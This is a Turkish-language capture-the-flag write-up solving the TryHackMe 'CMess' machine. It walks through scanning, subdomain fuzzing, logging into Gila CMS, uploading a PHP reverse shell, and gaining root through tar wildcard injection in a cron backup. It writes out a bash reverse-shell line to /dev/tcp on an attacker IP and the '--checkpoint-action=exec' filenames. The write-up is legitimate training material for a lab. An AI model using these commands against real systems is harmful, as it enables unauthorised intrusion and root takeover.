---
title: "THM CMess Write Up"
date: 2020-09-15T20:03:12+03:00
draft: false
toc: true
images: 
tags: [Tryhackme,write-up,gobuster,nmap,sudo,crontab,tar,wfuzz,wilcard İnjection,CMS] 
categories: [Write-up]
author : "Barcode"
Description : "Merhaba, bu yazımda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar..."
cover : images/thm/cmess/cover.png
  
---
{{< text >}}
Merhaba, bu yazımda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...
{{< /text >}}

## 1. Keşif Aşaması

Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.

```bash
sudo nmap -sV -sC 10.10.190.58 
```


{{< image src="/images/thm/cmess/nmap.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}


{{< text >}}
<br>
<i style="color:yellow"><b> cmess.thm </b></i> alan adı <i style="color:yellow"><b> /etc/hosts </b></i> dosyasına dns çözümlemesi için eklenmesi, makina tasarımcı tarafından istenmektedir. 
{{< /text >}}

```terminal
    sudo nano /etc/hosts
    --------------------
    ##Ekleme
    10.10.173.46    cmess.thm
```
{{< text >}}
Tarayıcı ile web servisine istek atılır. İçerik yönetim yazılımlarından olan Gila CMS web sayfası açılmaktadır.
{{< /text >}}
{{< image src="/images/thm/cmess/website.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Web dizininde yer alan dosyalar ve klasörlerin tespiti için gobuster kullanılır.

```terminal
gobuster dir -u http://10.10.190.58 -w /usr/share/wordlists/dirb/common.txt 
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.190.58
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/05 09:53:31 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 200)
/01 (Status: 200)
/1 (Status: 200)
/1x1 (Status: 200)
/about (Status: 200)
/About (Status: 200)
/admin (Status: 200)
/api (Status: 200)
/assets (Status: 301)
/author (Status: 200)
/blog (Status: 200)
/category (Status: 200)
/feed (Status: 200)
/fm (Status: 200)
/Index (Status: 200)
/index (Status: 200)
/lib (Status: 301)
/log (Status: 301)
/login (Status: 200)
/robots.txt (Status: 200)
/search (Status: 200)
/Search (Status: 200)
/server-status (Status: 403)
/sites (Status: 301)
/src (Status: 301)
/tag (Status: 200)
/tags (Status: 200)
/themes (Status: 301)
/tmp (Status: 301)
===============================================================
2020/09/05 09:54:20 Finished
===============================================================

```
{{< text >}}
Nmap ve gobuster taramalarında robots.txt dosyası içerisinde <i style="color:yellow"> /src, /themes, /lib </i> dizin girdileri yer almaktadır. Ayrıca /login dizinine girildiğinde giriş paneli görülmektedir.
{{< /text >}}

{{< image src="/images/thm/cmess/login.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}
{{< text >}}
Web dizininde yapılan alt dizin taramalarında herhangi bir kullanıcı adı ve parola bilgileri tespit edilememiştir. Wfuzz aracı ile subdomain taraması yapılarak alt alan adları tespit edilmeye çalışılır.Wordlist olarak SecLists listeler topluluğu içerisinde yeralan en çok kullanılan dns listesi kullanılır.
{{< /text >}}

**SecList Kurulumu**

```bash
##Zip Olarak Kurulumu
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
  && unzip SecList.zip \
  && rm -f SecList.zip

##Git İle Kurulumu
git clone https://github.com/danielmiessler/SecLists.git
```


```
wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm"  -H "Host: FUZZ.cmess.thm" --hw 290
```
{{< image src="/images/thm/cmess/wfuzz.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}
{{< text >}}


Tespit edilen subdomain önce <i style="color:yellow"> /etc/hosts </i> dosyasına subdomain.cmess.thm şekilde olacak şekilde eklenir ve adrese gidilir. İçerisinde bir kullanıcının destek ekibi ile yaptığı kullanıcı parola sıfırlama işlemine ait yazışmalar yer almaktadır. 
{{< /text >}}

{{< image src="/images/thm/cmess/passrecovery.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}
{{< text >}}
Kullanıcıya ait giriş bilgileri ile login panelinden giriş yapılır. CMS yönetim paneli açılmaktadır.
{{< /text >}}

{{< image src="/images/thm/cmess/webadmin.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Web panelinden shell almak için soldaki  **Content -> File Manager -> File Upload**  sekmesi takip edilerek [reverse shell](https://github.com/pentestmonkey/php-reverse-shell) kodlarının yer aldığı php sayfası upload edilir. Upload edilen dosya **src/assets** klasörü altında yer almaktadır.

{{< image src="/images/thm/cmess/upload.png" alt="Barcode" position="center" style="border-radius: 8px;" >}}

## 2. Erişim Sağlanması

```terminal
nc -lvp 4444
```

{{< text >}}
Upload ettiğimiz reverse shell dosyasında ayarlanan port dinlenmeye başlanır. Tarayıcı üzerinde reverse.php dosyası çağırılır ve shell bağlantısı gerçekleştirilir.
<br><br>
{{< /text >}}

{{< image src="/images/thm/cmess/nc.png" alt="Barcode" position="center" style="border-radius: 8px;" >}}

**www-data** kullanıcısı ile sisteme erişim sağladığından yetki yükseltmek için [LinEnum betiği](https://github.com/rebootuser/LinEnum) çalıştırlarak bilgi toplanır. Elde edilen bilgilerde __*/opt*__ dizini altında gizli bir password yedek dosyası görülmektedir. İçeriğine bakıldığında *andres* kullanısına ait oturum parolası elde edilir.


{{< image src="/images/thm/cmess/userpass.png" alt="Barcode" position="center" style="border-radius: 8px;" >}}


```bash
 su andres 
 ```
  komutu ile andres kullanıcısı ile oturum açılır. Daha sonra /home/andres dizininde yer alan user.txt dosyası okunur.

{{< image src="/images/thm/cmess/userflag.png" alt="Barcode" position="center" style="border-radius: 8px;" >}}

## 3. Yetki Yükseltme

Yetki yükseltme aşamasında zamanlanmış görevler, suid ve sgid biti aktif dosyalar, alınmış yedekler ve zayıf dosya yetkileri vb. kontrol edilir. Testlerde yaygın olarak sistem hakkında bilgiler [LinEnum betiği](https://github.com/rebootuser/LinEnum) kullanılarak elde edilir. Crontab içeriğinde tar uygulaması ile zamanlamış yedekleme işlemi dikkat çekmektedir. Backup klasöründeki herşey /tmp klasörü altına yedeklenmektedir.

{{< image src="/images/thm/cmess/crontab.png" alt="Barcode" position="center" style="border-radius: 8px;" >}}

Tar uygulamasında wilcard injection metodu ile yetki yükseltilebilmektedir. Linux sistemlerde joker karakter (wildcard) olarak kullanılan çeşitli karakterler vardır. Bunlardan bazıları ```{* , ?, [], -, ~ }``` .
Bunlar işlem yapılmadan önce kabuk tarafından yorumlanır. Tar ile uygulamasına bakacak olursak,yedeklenecek klasör içerisinde 3 adet dosya oluşturulur.
  1. Çalıştırılacak kabuk dosyası
  2. Tar uygulamasının parametre olarak alacağı 2 adet dosya
```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.8.97.33/6666 <&1'" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
Backup klasör içeriğine bakıldığında oluşturulan dosyalar görülmektedir.

{{< image src="/images/thm/cmess/tarwilcard.png" alt="Barcode" position="center" style="border-radius: 8px;" >}}


Tar uygulaması çalıştığında - - ile başlayan dosyaları parametre olarak alacak ve shell.sh dosyasını çalıştıracaktır. Shell dosyasında ayarlanan port dinlemeye alınır ve yedekleme çalıştığında root yetkisi ile oturum elde edilir.


```terminal
─[barcode@parrot]─[~]$ nc -lvp 6666
listening on [any] 6666 ...
connect to [10.8.97.33] from cmess.thm [10.10.173.46] 46366
bash: cannot set terminal process group (990): Inappropriate ioctl for device
bash: no job control in this shell
root@cmess:/home/andre/backup# cd
root@cmess:~# ls
root.txt
root@cmess:~# cat root.txt
**************************
root@cmess:~# 
```





